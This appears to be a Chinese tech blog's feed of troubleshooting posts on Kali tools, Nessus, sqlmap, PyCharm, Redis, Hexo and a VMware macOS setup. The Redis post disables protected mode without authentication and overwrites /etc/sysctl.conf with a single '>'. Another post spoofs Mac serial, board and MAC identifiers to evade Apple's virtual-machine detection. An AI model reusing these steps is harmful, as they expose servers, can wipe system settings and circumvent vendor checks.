<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># GitHub Start </span><br><span class="line">192.30.253.112    github.com </span><br><span class="line">192.30.253.119    gist.github.com</span><br><span class="line">151.101.184.133    assets-cdn.github.com</span><br><span class="line">151.101.184.133    raw.githubusercontent.com</span><br><span class="line">151.101.184.133    gist.githubusercontent.com</span><br><span class="line">151.101.184.133    cloud.githubusercontent.com</span><br><span class="line">151.101.184.133    camo.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars0.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars1.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars2.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars3.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars4.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars5.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars6.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars7.githubusercontent.com</span><br><span class="line">151.101.184.133    avatars8.githubusercontent.com</span><br><span class="line"># GitHub End</span><br></pre></td></tr></table></figure>

<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://element-ui.cn/news/show-17566.aspx">http://element-ui.cn/news/show-17566.aspx</a></p>
]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>github头像无法显示且加载速度慢</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-kali的arp-scan用不了</title>
    <url>//posts/ZH-CN/TroubleShoot_Kali_Arpscan.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>装了最新版本的kali2020.1，但是arp-scan居然用不了？！<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc2roi5vf6j30nq08h0vv.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>原来是因为这个软件使用的时候，必须使用<code>sudo</code>权限。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc2rq9svcwj30ou0io45i.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>arp-scan的安装命令：<br><code>sudo apt-get install arp-scan</code><br>扫描内网主机IP：<br><code>sudo arp-scan -l</code></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>kali的arp-scan用不了</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-nessus安装插件失败</title>
    <url>//posts/ZH-CN/troubleshooting-nessus-plugins-fail.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安装nessus扫描器，但是插件安装失败了，怎么办？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>进入nessus安装目录，手动输入命令<code>.\nessuscli.exe update</code>进行插件安装。<br><a href="https://v2ray.dana5haw.com:8008/image/xrIL"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image.png" alt="image.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/x7Ye"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image189424f5e855db59.png" alt="image189424f5e855db59.png"></a><br>最后，打开web客户端（也就是<code>https://localhost:8443</code>）即可进入登录界面：<br><a href="https://v2ray.dana5haw.com:8008/image/xEW3"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagecd996879bbab8630.png" alt="imagecd996879bbab8630.png"></a><br>登录之后：<br><a href="https://v2ray.dana5haw.com:8008/image/xUtB"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image5e1198fe87af73d9.png" alt="image5e1198fe87af73d9.png"></a></p>
]]></content>
      <categories>
        <category>问题解决</category>
        <category>扫描器</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>nessus</tag>
        <tag>插件安装</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-kali的msfconsole突然用不了</title>
    <url>//posts/ZH-CN/TroubleShoot_Kali_Msfconsole.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>更新了kali的镜像源为阿里镜像源之后，msfconsole突然无法使用了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfconsole </span><br><span class="line">[*] Bundler failed to load and returned this error:</span><br><span class="line"></span><br><span class="line">   &#x27;cannot load such file -- bundler/setup&#x27;</span><br><span class="line"></span><br><span class="line">[*] You may need to uninstall or upgrade bundler</span><br></pre></td></tr></table></figure>

<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>安装指定版本号的bundler：<code>sudo gem install bundler:1.17.3</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/usr/share/metasploit-framework$ sudo gem install bundler:1.17.3</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Fetching: bundler-1.17.3.gem (100%)</span><br><span class="line">Successfully installed bundler-1.17.3</span><br><span class="line">Parsing documentation for bundler-1.17.3</span><br><span class="line">Installing ri documentation for bundler-1.17.3</span><br><span class="line">Done installing documentation for bundler after 28 seconds</span><br><span class="line">1 gem installed</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.cnblogs.com/daxueba-ITdaren/p/12326036.html">https://www.cnblogs.com/daxueba-ITdaren/p/12326036.html</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>kali的msfconsole用不了</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-pycharm安装lxml模块超时</title>
    <url>//posts/ZH-CN/TroubleShoot_Pycharm_Lxml.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>pycharm安装lxml模块时，提示超时，安装不了。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>新建一个虚拟环境，勾选【Inherit global site-packages】和【Make available to all projects】这两个选项。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbysj5e5qoj30z60oo401.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbysicn1ugj30yh0jw3zl.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.jianshu.com/p/45e7c3dc2dbd">https://www.jianshu.com/p/45e7c3dc2dbd</a></p>
]]></content>
      <categories>
        <category>pycharm使用</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>pycharm安装lxml模块超时</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-pycharm报错找不到selenium模块</title>
    <url>//posts/ZH-CN/TroubleShoot_Pycharm_Selenium.html</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>在电脑上使用命令行<code>pip3 install selenium</code>安装了selenium模块之后，在pycharm里面运行程序报错<code>oduleNotFoundError: No module named &#39;selenium&#39;</code>。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>需要在pycharm环境安装这个selenium模块。我理解的是，pycharm实际是为我们创建了python的虚拟工作空间，在电脑上装了selenium以后，还得在这个虚拟工作空间里面再进行安装。真实环境就像银行账户，虚拟环境就是用户，账户里面新进了一笔账，用户得取出来才能使用。<br>在pycharm里面安装selenium的方法步骤如图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw4ou7bl5j31f60u0tdd.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.cnblogs.com/linxiu-0925/p/9855014.html">https://www.cnblogs.com/linxiu-0925/p/9855014.html</a></p>
]]></content>
      <categories>
        <category>pycharm使用</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>pycharm找不到selenium模块</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-scrapy安装报错</title>
    <url>//posts/ZH-CN/TroubleShoot_Scrapy.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>win10安装scrapy时，报错<code>Microsoft Visual C++ 14.0 is required.</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbyq7y0gopj30xz0hr419.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted">下载</a>twisted的whl文件，用<code>pip3 install *.whl</code>进行安装。不得不吐槽这个网站在国内访问速度太慢了，2.9M大小，下载了半个多小时……<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbyrv2lkg8j30xz0mkwge.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbyrvt5nr9j30xz0hracf.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/u012257589/article/details/72821992">https://blog.csdn.net/u012257589/article/details/72821992</a></p>
]]></content>
      <categories>
        <category>安装教程</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>scrapy安装报错</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-sqlmap使用报错</title>
    <url>//posts/ZH-CN/TroubleShoot_Sqlmap_Error.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>使用python3.8运行sqlmap，报错<code>sqlmap.py: error: missing a mandatory option</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtotq3n8uj30xz0hr0tw.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>安装python2.7，使用<code>python sqlmap.py</code>命令运行sqlmap。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtp01v9n5j30xe0dudh9.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/qq_43776408/article/details/86653741">https://blog.csdn.net/qq_43776408/article/details/86653741</a></p>
]]></content>
      <categories>
        <category>安装教程</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>sqlmap使用报错</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-ubuntu启动redis-server报错</title>
    <url>//posts/ZH-CN/TroubleShoot_Ubuntu_Redis-server.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>ubuntu启动redis-server报错。</p>
<p><escape> <span id="more"></span></escape></p>
<p>查看redis运行日志<code>cat /var/log/redis/redis-server.log</code>，发现以下告警信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1888:M 27 Feb 2020 07:42:29.235 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</span><br><span class="line">1888:M 27 Feb 2020 07:42:29.235 # Server initialized</span><br><span class="line">1888:M 27 Feb 2020 07:42:29.235 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &#x27;vm.overcommit_memory = 1&#x27; to /etc/sysctl.conf and then reboot or run the command &#x27;sysctl vm.overcommit_memory=1&#x27; for this to take effect.</span><br><span class="line">1888:M 27 Feb 2020 07:42:29.235 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&#x27; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.</span><br></pre></td></tr></table></figure>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>使用root用户进行以下操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 511 &gt; /proc/sys/net/core/somaxconn</span><br><span class="line">echo &quot;vm.overcommit_memory=1&quot; &gt; /etc/sysctl.conf</span><br><span class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br></pre></td></tr></table></figure>
<p>之后重启redis-server：<code>service redis-server restart</code>。</p>
<h2 id="新的问题"><a href="#新的问题" class="headerlink" title="新的问题"></a>新的问题</h2><p>远程连接运行redis命令，发现如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.80.17:6379&gt; ping</span><br><span class="line">(error) DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command &#x27;CONFIG SET protected-mode no&#x27; from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to &#x27;no&#x27;, and then restarting the server. 3) If you started the server manually just for testing, restart it with the &#x27;--protected-mode no&#x27; option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.</span><br></pre></td></tr></table></figure>
<p>解决方法：<br>修改配置文件<code>vi /etc/redis/redis.conf</code>：<br>将<code>protected-mode yes</code>改为<code>protected-mode no</code>，之后 重启redis-server：<code>service redis-server restart</code>。</p>
<hr>
<p>但是不知道为什么重启redis-server老报错：（这种情况下，redis数据库却能正常使用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@dana:~# service redis-server restart</span><br><span class="line">Job for redis-server.service failed because a timeout was exceeded.</span><br><span class="line">See &quot;systemctl status redis-server.service&quot; and &quot;journalctl -xe&quot; for details.</span><br></pre></td></tr></table></figure>
<p>redis服务正常：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dana:~# ps aux |grep 6379</span><br><span class="line">redis      3107  0.3  0.3  50092  6644 ?        Ssl  08:38   0:00 /usr/bin/redis-server *:6379</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.51cto.com/sf1314/2156127">https://blog.51cto.com/sf1314/2156127</a></p>
]]></content>
      <categories>
        <category>redis数据库</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>ubuntu启动redis-server报错</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-ubuntu机器无法远程ssh登录</title>
    <url>//posts/ZH-CN/TroubleShoot_Ubuntu_Ssh.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>ubuntu机器ssh远程登录失败。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>原因是这个机器没有安装ssh服务。需要我们手动安装ssh服务：<code>sudo apt install openssh_server</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9rjxeos1j30ii086q3e.jpg" alt="image.png"><br>安装过程很不顺利。更改镜像源为国内清华源，安装ssh依然失败。<br>最后，把镜像源改回自带的镜像源，重新安装，反复试了好几次，终于又装上了……不晓得是什么问题😥<br>安装成功之后，开启ssh服务，就可以远程ssh登录ubuntu了。<br><code>sudo service ssh start</code></p>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>ubuntu机器无法远程ssh登录</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-win10运行phantomjs报错</title>
    <url>//posts/ZH-CN/TroubleShoot_Win10_Phantomjs.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>win10环境下，用python脚本运行phantomjs报错<code>phantomjs.exe unexpectedly exited. Status code was: 4294967295</code>。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>重新安装一个低版本的<code>phantomjs-2.1.1-windows</code>。出现这个报错的原因是存在兼容问题。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://www.30daydo.com/article/505">http://www.30daydo.com/article/505</a></p>
]]></content>
      <categories>
        <category>phantomjs</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>phantomjs运行报错</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-hexo+next主题本地搜索框被覆盖</title>
    <url>//posts/ZH-CN/TroubleShoot_Hexo_Next_SearchBox.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>本地搜索框被覆盖，搜索框置于页面底层，无法点击搜索到的链接😥一个月以前就想把这个问题解决了，但是在网上找了很久，无疾而终。今天无意间找到了解决方法。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p><a href="https://github.com/theme-next/hexo-theme-next/issues/914">原因</a>是<a href="https://bufsnake.github.io/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html">自定义的样式</a>设置了透明度opacity这个参数，而设置opacity的元素会创建新的层叠上下文，这就导致搜索框置于页面底层。<br>解决方法：将这个自定义样式文件<code>C:\Users\admin\myBlog\source\_data\styles.styl</code>里面的opacity参数去掉。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnn693g84j30ob0gsgnq.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnnd50zpkj30p90gsdh1.jpg" alt="image.png"><br>输入<code>hexo s</code>在<a href="http://localhost:4000">本地</a>预览一下效果，搜索框终于正常显示了：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnnvq15q3j31f60u04o9.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo+next主题</tag>
        <tag>问题解决</tag>
        <tag>本地搜索框被覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-vmware黑苹果登不上appleid</title>
    <url>//posts/ZH-CN/TroubleShoot_Vmware_BlackApple_Appleid.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>appleid申请下来之后，vmware环境安装的黑苹果始终登不上iCloud和App Store。提示「此apple ID有效 但不是iCloud账户」，「此账户Apple ID 尚未用于 App Store。」</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>在网上找了很多方法教程，未果。最后在<a href="https://www.youtube.com/watch?v=S7UFEpbEYFM">youtube</a>找到一个有效方法。<br>原因其实就是因为本人没有苹果设备，而iCloud和App Store这些服务要把appleid绑定到苹果设备之后才能够使用，vmware装的黑苹果直接被官方识别为vm虚拟机，无法绑定appleid。另外，申请appleid的时候，信息要补充完整，尤其是付款方式和寄送地址。奇怪的是，我绑定iCloud用的付款方式是微信，可以正常绑定。但是绑定App Store还得换成绑定支付宝才成功。<br>主要的破解方法，就是把虚拟机伪造成真机。怎么伪造？我们要用到CloverConfigure这个工具，利用这个工具生成真机的配置信息，将信息填写到vmware虚拟机文件<code>macOS 10.14.vmx</code>，并且从<a href="https://hwaddress.com/mac-address-range">这个网站</a>随机选一个MAC地址填进去，将虚拟机模拟成真机。重启机器之后，官方检测到我们的appleid绑定的设备就是真机了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrvqxkbx0j31f60u00wo.jpg" alt="image.png"></p>
<h3 id="CloverConfigure伪造真机信息"><a href="#CloverConfigure伪造真机信息" class="headerlink" title="CloverConfigure伪造真机信息"></a>CloverConfigure伪造真机信息</h3><p>这是<a href="https://mackie100projects.altervista.org/download-clover-configurator/">CloverConfigure下载地址</a>，任意选择一个型号，生成真机信息就行。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrvtsha4dj310s0rntme.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrvv48c5gj310s0rn7it.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrvvwcorhj310s0rnna9.jpg" alt="image.png"><br>将这些数据对应替换掉<code>AAA</code>、<code>BBB</code>、<code>CCC</code>、<code>DDD</code>、<code>EEE</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">board-id = &quot;AAA&quot; #board-id</span><br><span class="line">hw.model.reflectHost = &quot;FALSE&quot;</span><br><span class="line">hw.model = &quot;BBB&quot; #Productname</span><br><span class="line">serialNumber.reflectHost = &quot;FALSE&quot;</span><br><span class="line">serialNumber = &quot;CCC&quot; #序列号</span><br><span class="line">smbios.reflectHost = &quot;FALSE&quot;</span><br><span class="line">efi.nvram.var.ROM.reflectHost = &quot;FALSE&quot;</span><br><span class="line">efi.nvram.var.MLB.reflectHost = &quot;FALSE&quot;</span><br><span class="line">efi.nvram.var.ROM = &quot;DDD&quot; #ROM</span><br><span class="line">efi.nvram.var.MLB = &quot;EEE&quot; #BoardSerialNum</span><br></pre></td></tr></table></figure>
<p>将以上内容粘贴到虚拟机文件<code>macOS 10.14.vmx</code>（这个文件用记事本打开），并且修改以下内容（其中<code>FFF</code>要替换成我们随意挑选的MAC地址，在哪里去挑选MAC地址？看下一段说明）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">board-id.reflectHost = &quot;TRUE&quot;			#TRUE改为FALSE</span><br><span class="line">ethernet0.addressType = &quot;generated&quot;		#generated改为static</span><br><span class="line">ethernet0.generatedAddress = &quot;xx:xx:xx:xx:xx:xx&quot;	#改为 ethernet0.Address = &quot;FFF&quot; #这里的FFF要替换成我们随意挑选的MAC地址</span><br><span class="line">ethernet0.generatedAddressOffset = &quot;0&quot;		#改为 ethernet0.checkMACAddress = &quot;false&quot;</span><br></pre></td></tr></table></figure>
<p><a href="https://hwaddress.com/mac-address-range">随机MAC网址</a>，我们在这一列<code>Unix zero-padded</code>中随意选择一个MAC地址作为真机的MAC。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrw3r6zqvj31f60u0td2.jpg" alt="image.png"><br>最终，<code>macOS 10.14.vmx</code>这个文件就成了这样：</p>
<details><summary>点击展开文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.encoding = &quot;GBK&quot;</span><br><span class="line">config.version = &quot;8&quot;</span><br><span class="line">virtualHW.version = &quot;16&quot;</span><br><span class="line">pciBridge0.present = &quot;TRUE&quot;</span><br><span class="line">pciBridge4.present = &quot;TRUE&quot;</span><br><span class="line">pciBridge4.virtualDev = &quot;pcieRootPort&quot;</span><br><span class="line">pciBridge4.functions = &quot;8&quot;</span><br><span class="line">pciBridge5.present = &quot;TRUE&quot;</span><br><span class="line">pciBridge5.virtualDev = &quot;pcieRootPort&quot;</span><br><span class="line">pciBridge5.functions = &quot;8&quot;</span><br><span class="line">pciBridge6.present = &quot;TRUE&quot;</span><br><span class="line">pciBridge6.virtualDev = &quot;pcieRootPort&quot;</span><br><span class="line">pciBridge6.functions = &quot;8&quot;</span><br><span class="line">pciBridge7.present = &quot;TRUE&quot;</span><br><span class="line">pciBridge7.virtualDev = &quot;pcieRootPort&quot;</span><br><span class="line">pciBridge7.functions = &quot;8&quot;</span><br><span class="line">vmci0.present = &quot;TRUE&quot;</span><br><span class="line">hpet0.present = &quot;TRUE&quot;</span><br><span class="line">ich7m.present = &quot;TRUE&quot;</span><br><span class="line">board-id.reflectHost = &quot;FALSE&quot;</span><br><span class="line">displayName = &quot;macOS 10.14&quot;</span><br><span class="line">guestOS = &quot;darwin18-64&quot;</span><br><span class="line">nvram = &quot;macOS 10.14.nvram&quot;</span><br><span class="line">virtualHW.productCompatibility = &quot;hosted&quot;</span><br><span class="line">powerType.powerOff = &quot;soft&quot;</span><br><span class="line">powerType.powerOn = &quot;soft&quot;</span><br><span class="line">powerType.suspend = &quot;soft&quot;</span><br><span class="line">powerType.reset = &quot;soft&quot;</span><br><span class="line">usb.vbluetooth.startConnected = &quot;TRUE&quot;</span><br><span class="line">smc.present = &quot;TRUE&quot;</span><br><span class="line">smbios.restrictSerialCharset = &quot;TRUE&quot;</span><br><span class="line">firmware = &quot;efi&quot;</span><br><span class="line">tools.syncTime = &quot;FALSE&quot;</span><br><span class="line">sound.autoDetect = &quot;TRUE&quot;</span><br><span class="line">sound.virtualDev = &quot;hdaudio&quot;</span><br><span class="line">sound.fileName = &quot;-1&quot;</span><br><span class="line">sound.present = &quot;TRUE&quot;</span><br><span class="line">numvcpus = &quot;4&quot;</span><br><span class="line">memsize = &quot;4096&quot;</span><br><span class="line">sata0.present = &quot;TRUE&quot;</span><br><span class="line">sata0:0.fileName = &quot;macOS 10.14.vmdk&quot;</span><br><span class="line">sata0:0.present = &quot;TRUE&quot;</span><br><span class="line">sata0:1.deviceType = &quot;cdrom-image&quot;</span><br><span class="line">sata0:1.fileName = &quot;E:\mac\darwin10_1.iso&quot;</span><br><span class="line">sata0:1.present = &quot;TRUE&quot;</span><br><span class="line">usb.present = &quot;TRUE&quot;</span><br><span class="line">ehci.present = &quot;TRUE&quot;</span><br><span class="line">usb_xhci.present = &quot;TRUE&quot;</span><br><span class="line">ethernet0.addressType = &quot;static&quot;</span><br><span class="line">ethernet0.virtualDev = &quot;e1000e&quot;</span><br><span class="line">ethernet0.present = &quot;TRUE&quot;</span><br><span class="line">extendedConfigFile = &quot;macOS 10.14.vmxf&quot;</span><br><span class="line">floppy0.present = &quot;FALSE&quot;</span><br><span class="line">numa.autosize.cookie = &quot;40022&quot;</span><br><span class="line">numa.autosize.vcpu.maxPerVirtualNode = &quot;4&quot;</span><br><span class="line">uuid.bios = &quot;56 4d 1c 66 98 ea 89 d7-e9 fe 59 4e 8c 07 0c c6&quot;</span><br><span class="line">uuid.location = &quot;56 4d 1c 66 98 ea 89 d7-e9 fe 59 4e 8c 07 0c c6&quot;</span><br><span class="line">sata0:0.redo = &quot;&quot;</span><br><span class="line">pciBridge0.pciSlotNumber = &quot;17&quot;</span><br><span class="line">pciBridge4.pciSlotNumber = &quot;21&quot;</span><br><span class="line">pciBridge5.pciSlotNumber = &quot;22&quot;</span><br><span class="line">pciBridge6.pciSlotNumber = &quot;23&quot;</span><br><span class="line">pciBridge7.pciSlotNumber = &quot;24&quot;</span><br><span class="line">usb.pciSlotNumber = &quot;32&quot;</span><br><span class="line">ethernet0.pciSlotNumber = &quot;160&quot;</span><br><span class="line">sound.pciSlotNumber = &quot;33&quot;</span><br><span class="line">ehci.pciSlotNumber = &quot;34&quot;</span><br><span class="line">usb_xhci.pciSlotNumber = &quot;192&quot;</span><br><span class="line">vmci0.pciSlotNumber = &quot;35&quot;</span><br><span class="line">sata0.pciSlotNumber = &quot;36&quot;</span><br><span class="line">svga.vramSize = &quot;134217728&quot;</span><br><span class="line">vmotion.checkpointFBSize = &quot;134217728&quot;</span><br><span class="line">vmotion.checkpointSVGAPrimarySize = &quot;134217728&quot;</span><br><span class="line">ethernet0.Address = &quot;00:03:93:00:00:06&quot;</span><br><span class="line">ethernet0.checkMACAddress = &quot;false&quot;</span><br><span class="line">vmci0.id = &quot;-1945695034&quot;</span><br><span class="line">monitor.phys_bits_used = &quot;43&quot;</span><br><span class="line">cleanShutdown = &quot;FALSE&quot;</span><br><span class="line">softPowerOff = &quot;FALSE&quot;</span><br><span class="line">usb_xhci:6.speed = &quot;2&quot;</span><br><span class="line">usb_xhci:6.present = &quot;TRUE&quot;</span><br><span class="line">usb_xhci:6.deviceType = &quot;hub&quot;</span><br><span class="line">usb_xhci:6.port = &quot;6&quot;</span><br><span class="line">usb_xhci:6.parent = &quot;-1&quot;</span><br><span class="line">usb_xhci:7.speed = &quot;4&quot;</span><br><span class="line">usb_xhci:7.present = &quot;TRUE&quot;</span><br><span class="line">usb_xhci:7.deviceType = &quot;hub&quot;</span><br><span class="line">usb_xhci:7.port = &quot;7&quot;</span><br><span class="line">usb_xhci:7.parent = &quot;-1&quot;</span><br><span class="line">board-id = &quot;Mac-F22587C8&quot;</span><br><span class="line">hw.model.reflectHost = &quot;FALSE&quot;</span><br><span class="line">hw.model = &quot;MacBookPro5,3&quot;</span><br><span class="line">serialNumber.reflectHost = &quot;FALSE&quot;</span><br><span class="line">serialNumber = &quot;W80326YR7XK&quot;</span><br><span class="line">smbios.reflectHost = &quot;FALSE&quot;</span><br><span class="line">efi.nvram.var.ROM.reflectHost = &quot;FALSE&quot;</span><br><span class="line">efi.nvram.var.MLB.reflectHost = &quot;FALSE&quot;</span><br><span class="line">efi.nvram.var.ROM = &quot;8047F15CB5F3&quot;</span><br><span class="line">efi.nvram.var.MLB = &quot;W80310204000Y&quot;</span><br><span class="line">usb:1.speed = &quot;2&quot;</span><br><span class="line">usb:1.present = &quot;TRUE&quot;</span><br><span class="line">usb:1.deviceType = 